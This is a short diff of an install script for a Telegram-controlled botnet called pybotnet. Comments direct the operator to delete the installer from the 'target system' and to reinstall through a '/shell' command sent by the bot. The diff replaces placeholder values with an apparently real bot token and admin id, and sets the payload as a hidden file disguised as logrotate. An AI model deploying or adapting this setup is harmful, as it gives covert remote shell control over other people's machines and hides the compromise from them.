@@ -9,9 +9,9 @@
 # - remove install_as_service.sh from target system
 # - if pybotnet update is available, in telegram bot send `/shell systemctl restart logrotate` to reinstall pybotnet
 
-telegram_bot_token=552670482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
-admin_id=902347166
-bot_name=example_bot_name
+telegram_bot_token=5088527232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGsBGY
+admin_id=790311667
+bot_name=ati_logrotate
 
 
 botnet="/root/.config/.logrotate.sh"
